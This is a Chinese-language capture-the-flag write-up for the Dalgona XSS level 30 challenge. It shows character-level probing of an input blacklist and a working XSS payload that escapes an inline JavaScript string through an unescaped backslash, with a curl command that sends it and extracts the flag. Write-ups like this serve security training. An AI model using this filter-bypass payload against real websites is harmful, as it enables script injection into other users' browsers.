## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 第 30 关（`static/css/xss/xss30.css`）。
`/page?name=` 的输入被放进内联脚本的字符串：

```html
<script> var name = "<input>"; document.write('Hello ' + name); </script>
```

### 关键观察

**1. 黑名单是「大写字母 + `< > ' [ ]`」，小写、数字和其余符号都放行。**

单个字符探测结果：

| 类别 | 结果 |
| --- | --- |
| `A` `Q` `Z` | 拦截（`Sorry you can't use: 'A'`） |
| `<` `>` `'` `[` `]` | 拦截 |
| `a`–`z`、`0`–`9`、`"`、`/`、`(`、`)`、`;`、`%`、`` ` ``、`\` | 放行 |

**2. 双引号被转义成 `\"`，但反斜杠本身不转义。**

输入 `\";...` 会变成 `\\";`（字面反斜杠 + 字符串结束），成功跳出字符串。
代码里的双引号会被转义，所以内部字符串改用**反引号**。

**3. 目标字符串 `XSS` 是大写，不能直接写；用 `unescape("%58%53%53")`。**

### 利用链

```bash
T=$(head -1 .target)
curl -sS -G \
  --data-urlencode 'name=\";alert(unescape(`%58%53%53`));//' \
  "http://$T/page" | grep -o 'flag{[^}]*}'
```

渲染结果：

```html
var name = "\\";alert(unescape(`%58%53%53`));//"; document.write('Hello ' + name);
```

### flag 位置

`/page` 成功响应里 `Here is the flag:` 之后。

## 复盘

- 字符级探测把「关键字黑名单」和「字符黑名单」区分开，再决定绕过方式。
- 反斜杠不转义时，`\"` 就是标准的 JS 字符串逃逸；配合 `//` 注释收尾。
- 内部需要双引号时用模板字符串（反引号）避开转义。
